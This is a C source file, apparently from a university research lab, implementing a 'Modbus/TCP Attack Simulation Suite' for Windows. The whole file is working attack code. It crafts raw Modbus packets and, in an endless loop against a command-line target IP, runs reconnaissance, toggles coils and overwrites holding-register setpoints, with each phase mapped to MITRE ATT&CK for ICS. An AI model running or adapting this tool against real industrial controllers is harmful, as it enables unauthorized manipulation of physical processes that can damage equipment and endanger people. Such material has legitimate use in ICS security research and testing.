/**
 * ============================================================================
 * Modbus/TCP Attack Simulation Suite
 * ============================================================================
 * 
 * Authors:     Mahmoud A. Khalifa, Ahmad Taher Azar, Walid El-Shafai
 * Institution: Automated Systems and Computing Lab (ASCL)
 *              Prince Sultan University, Riyadh, Saudi Arabia
 * Contact:     mzian@psu.edu.sa (Corresponding Author)
 * 
 * Description: Educational tool demonstrating Modbus/TCP protocol vulnerabilities
 *              for research and security assessment purposes.
 * 
 * WARNING:     FOR EDUCATIONAL AND AUTHORIZED RESEARCH USE ONLY.
 *              Unauthorized access to computer systems is illegal.
 * 
 * License:     MIT License
 * 
 * ============================================================================
 * MITRE ATT&CK for ICS Mapping:
 * ----------------------------------------------------------------------------
 * Phase 1 - Reconnaissance:     T0888 (Remote System Information Discovery)
 * Phase 2 - Coil Manipulation:  T0855 (Unauthorized Command Message)
 * Phase 3 - Process Monitoring: T0801 (Monitor Process State)
 * Phase 4 - Setpoint Tampering: T0836 (Modify Parameter)
 * ============================================================================
 * 
 * Compilation:
 *   gcc Modbus_attack.c -o modbus_attack.exe -lws2_32
 * 
 * Usage:
 *   modbus_attack.exe [target_ip]
 *   modbus_attack.exe 192.168.1.100
 * 
 * ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define MODBUS_PORT 502

/**
 * FC01: Read Coils - Reconnaissance Attack
 * MITRE ATT&CK: T0888 - Remote System Information Discovery
 */
void craft_modbus_read_coils_packet(char *buffer, int *length, int starting_address, int quantity_of_coils) {
    buffer[0] = 0x00; buffer[1] = 0x01;  // Transaction Identifier
    buffer[2] = 0x00; buffer[3] = 0x00;  // Protocol Identifier
    buffer[4] = 0x00; buffer[5] = 0x06;  // Length
    buffer[6] = 0x01;                     // Unit Identifier
    buffer[7] = 0x01;                     // Function Code (Read Coils)
    buffer[8] = (starting_address >> 8) & 0xFF; 
    buffer[9] = starting_address & 0xFF;
    buffer[10] = (quantity_of_coils >> 8) & 0xFF; 
    buffer[11] = quantity_of_coils & 0xFF;
    *length = 12;
}

/**
 * FC05: Write Single Coil - Actuator Manipulation Attack
 * MITRE ATT&CK: T0855 - Unauthorized Command Message
 */
void craft_modbus_write_single_coil_packet(char *buffer, int *length, int coil_address, int coil_value) {
    buffer[0] = 0x00; buffer[1] = 0x01;
    buffer[2] = 0x00; buffer[3] = 0x00;
    buffer[4] = 0x00; buffer[5] = 0x06;
    buffer[6] = 0x01;
    buffer[7] = 0x05;                     // Function Code (Write Single Coil)
    buffer[8] = (coil_address >> 8) & 0xFF; 
    buffer[9] = coil_address & 0xFF;
    buffer[10] = (coil_value ? 0xFF : 0x00); 
    buffer[11] = 0x00;
    *length = 12;
}

/**
 * FC03: Read Holding Registers - Process Monitoring Attack
 * MITRE ATT&CK: T0801 - Monitor Process State
 */
void craft_modbus_read_holding_registers_packet(char *buffer, int *length, int starting_address, int quantity_of_registers) {
    buffer[0] = 0x00; buffer[1] = 0x01;
    buffer[2] = 0x00; buffer[3] = 0x00;
    buffer[4] = 0x00; buffer[5] = 0x06;
    buffer[6] = 0x01;
    buffer[7] = 0x03;                     // Function Code (Read Holding Registers)
    buffer[8] = (starting_address >> 8) & 0xFF; 
    buffer[9] = starting_address & 0xFF;
    buffer[10] = (quantity_of_registers >> 8) & 0xFF; 
    buffer[11] = quantity_of_registers & 0xFF;
    *length = 12;
}

/**
 * FC06: Write Single Register - Setpoint Tampering Attack
 * MITRE ATT&CK: T0836 - Modify Parameter
 */
void craft_modbus_write_single_register_packet(char *buffer, int *length, int register_address, int register_value) {
    buffer[0] = 0x00; buffer[1] = 0x01;
    buffer[2] = 0x00; buffer[3] = 0x00;
    buffer[4] = 0x00; buffer[5] = 0x06;
    buffer[6] = 0x01;
    buffer[7] = 0x06;                     // Function Code (Write Single Register)
    buffer[8] = (register_address >> 8) & 0xFF; 
    buffer[9] = register_address & 0xFF;
    buffer[10] = (register_value >> 8) & 0xFF; 
    buffer[11] = register_value & 0xFF;
    *length = 12;
}

/**
 * Send Modbus/TCP packet to target server
 */
void send_modbus_packet(const char *ip, int port, char *buffer, int length) {
    WSADATA wsa;
    SOCKET sockfd;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[ERROR] WSAStartup failed: %d\n", WSAGetLastError());
        return;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        printf("[ERROR] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        printf("[ERROR] Connection failed: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return;
    }

    send(sockfd, buffer, length, 0);
    closesocket(sockfd);
    WSACleanup();
}

/**
 * Main function - Attack orchestration
 */
int main(int argc, char *argv[]) {
    char buffer[256];
    int length;
    const char *target_ip = "127.0.0.1";  // Default target
    int cycle = 0;

    // Allow command-line IP override
    if (argc > 1) {
        target_ip = argv[1];
    }

    // Print banner
    printf("============================================================\n");
    printf("  Modbus/TCP Attack Simulation Suite\n");
    printf("  Automated Systems and Computing Lab (ASCL)\n");
    printf("  Prince Sultan University\n");
    printf("============================================================\n\n");
    printf("  [!] WARNING: For educational/research use only!\n");
    printf("  [!] Unauthorized access to systems is illegal.\n\n");
    printf("  Target: %s:%d\n", target_ip, MODBUS_PORT);
    printf("  Press Ctrl+C to stop\n");
    printf("============================================================\n\n");

    // Main attack loop
    while (1) {
        cycle++;
        printf("\n=== Attack Cycle %d ===\n", cycle);

        // Phase 1: Reconnaissance (FC01)
        printf("[Phase 1] Reconnaissance - Reading 16 coils...\n");
        craft_modbus_read_coils_packet(buffer, &length, 0, 16);
        send_modbus_packet(target_ip, MODBUS_PORT, buffer, length);

        // Phase 2: Coil Manipulation (FC05)
        printf("[Phase 2] Coil Manipulation - Toggling 10 coils...\n");
        for (int i = 0; i < 10; i++) {
            craft_modbus_write_single_coil_packet(buffer, &length, i, 1);  // ON
            send_modbus_packet(target_ip, MODBUS_PORT, buffer, length);
            craft_modbus_write_single_coil_packet(buffer, &length, i, 0);  // OFF
            send_modbus_packet(target_ip, MODBUS_PORT, buffer, length);
        }

        // Phase 3: Process Monitoring (FC03)
        printf("[Phase 3] Process Monitoring - Reading 16 registers...\n");
        craft_modbus_read_holding_registers_packet(buffer, &length, 0, 16);
        send_modbus_packet(target_ip, MODBUS_PORT, buffer, length);

        // Phase 4: Setpoint Tampering (FC06)
        printf("[Phase 4] Setpoint Tampering - Writing to 10 registers...\n");
        for (int i = 0; i < 10; i++) {
            craft_modbus_write_single_register_packet(buffer, &length, i, 1234);
            send_modbus_packet(target_ip, MODBUS_PORT, buffer, length);
        }

        printf("[*] Cycle %d complete. Waiting 1 second...\n", cycle);
        Sleep(1000);
    }

    return 0;
}
